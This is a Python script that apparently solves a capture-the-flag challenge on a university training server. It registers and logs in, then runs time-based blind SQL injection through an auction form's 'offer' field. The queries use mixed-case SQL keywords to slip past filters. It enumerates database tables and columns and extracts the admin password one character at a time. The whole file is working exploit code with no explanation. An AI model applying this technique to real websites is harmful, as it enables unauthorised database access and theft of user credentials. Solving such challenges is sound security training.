import requests
import string
from time import time, sleep
import binascii

# Global constants
BASE_URL = "http://cyberchallenge.disi.unitn.it:50050"
REGISTER_ENDPOINT = "/register"
LOGIN_ENDPOINT = "/login"
AUCTION_ENDPOINT = "/product/5"

SLEEP_TIME = 3


##################################################

def register(username: str, password: str):
    payload = {
        "username": username,
        "password": password,
        "confirm-password": password
    }

    url = f"{BASE_URL}{REGISTER_ENDPOINT}"

    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()
        print(f"HTTP Response Code (register): {response.status_code}")
        print("You have been successfully registered!")

    except requests.exceptions.RequestException as e:
        print(f"\n[ERROR] HTTP Request Failed during registration: {e}")

    return username, password


def login(username: str, password: str):
    payload = {
        "username": username,
        "password": password
    }

    login_url = f"{BASE_URL}{LOGIN_ENDPOINT}"
    protected_url = f"{BASE_URL}"

    try:
        session = requests.Session()
        response = session.post(login_url, data=payload)
        response.raise_for_status()
        print(f"\nHTTP Response Code (login): {response.status_code}")
        print("\nCorrectly logged into the index page\n\n")

        session.get(protected_url)
        return session

    except requests.exceptions.RequestException as e:
        print(f"\n[ERROR] HTTP Request Failed during login or fetch: {e}")
        return None


##################################################

def string_to_hex(input_string: str):
    return binascii.hexlify(input_string.encode('utf-8')).decode('utf-8').upper()


def table_names(session: requests.Session):
    print("Starting full table name extraction with time-based SQLi (simple SLEEP)...\n")

    found_tables = []
    table = "infoRmation_schema.tables"

    while True:
        current_table = ""

        while True:
            found_char = False

            for c in string.printable:
                hex_prefix = string_to_hex(current_table + c)

                exclusion = ""
                if found_tables:
                    excluded = ",".join(f"'{t}'" for t in found_tables)
                    exclusion = f" ANd TABLE_NAME NOT IN ({excluded})"

                payload = f"1 ANd (SELECt SLEEP({SLEEP_TIME}) FROM {table} WHERe HEX(TABLE_NAME) LIKE '{hex_prefix}%' {exclusion})"
                data = {"offer": f"{payload}"}

                start = time()
                try:
                    session.post(f"{BASE_URL}{AUCTION_ENDPOINT}", data=data)
                    delta = time() - start

                    if delta >= SLEEP_TIME:
                        current_table += c
                        print(f"[+] Partial: {current_table}")
                        found_char = True
                        break

                except Exception as e:
                    print(f"[!] Error for char '{c}': {e}")

            if not found_char:
                break

        if current_table:
            found_tables.append(current_table)
            print(f"[>] Found table: {current_table}")
        else:
            break

    print("\n[>] Enumeration complete. Tables found:")
    for t in found_tables:
        print(f" - {t}")


def column_names(session: requests.Session, table_name: str):
    print(f"Starting full column name enumeration for table '{table_name}' using time-based SQLi...\n")

    found_columns = []
    table = "infoRmation_schema.columns"

    while True:
        current_column = ""

        while True:
            found_char = False

            for c in string.printable:
                hex_prefix = string_to_hex(current_column + c)

                exclusion = ""
                if found_columns:
                    excluded = ",".join(f"'{string_to_hex(col)}'" for col in found_columns)
                    exclusion = f" ANd HEX(COLUMN_NAME) NOT IN ({excluded})"

                payload = f"1 ANd (SELECt SLEEP({SLEEP_TIME}) FROm {table} WHERe TABLE_NAME='{table_name}' ANd HEX(COLUMN_NAME) LIKE '{hex_prefix}%' {exclusion})"

                data = {"offer": f"{payload}"}

                start = time()
                try:
                    session.post(f"{BASE_URL}{AUCTION_ENDPOINT}", data=data)
                    delta = time() - start

                    if delta >= SLEEP_TIME:
                        current_column += c
                        print(f"[+] Partial: {current_column}")
                        found_char = True
                        break

                except Exception as e:
                    print(f"[!] Error for char '{c}': {e}")

            if not found_char:
                break

        if current_column:
            found_columns.append(current_column)
            print(f"[>] Found column: {current_column} \n")
        else:
            break

    print(f"\n[>] Enumeration complete. Columns in '{table_name}':")
    for col in found_columns:
        print(f" - {col}")


def admin_password(session: requests.Session):
    print("Starting blind SQLi password extraction for user 'admin'...\n")

    password = ""
    column = "passwoRd"
    table = "user"
    username = "admin"

    while True:
        found_char = False

        for c in string.printable:

            hex_prefix = string_to_hex(password + c)

            payload = f"1 ANd (SELECt SLEEP({SLEEP_TIME}) FROm {table} WHERe username='{username}' AnD HEX({column}) LIKE '{hex_prefix}%')"
            data = {"offer": f"{payload}"}

            start = time()
            try:
                session.post(f"{BASE_URL}{AUCTION_ENDPOINT}", data=data)
                delta = time() - start

                if delta >= SLEEP_TIME:
                    password += c
                    print(f"[+] Current password: {password}")
                    found_char = True
                    break

            except Exception as e:
                print(f"[!] Request failed for character '{c}': {e}")

        if not found_char:
            print("\n[>] Password extraction complete.")
            print(f"[>] Final password: {password}")
            return password


    return None

##################################################



if __name__ == "__main__":
    
    username, password = register("ab", "1")
    session = login(username, password)

    #table_names(session)
    column_names(session, "user")
    admin_password(session)
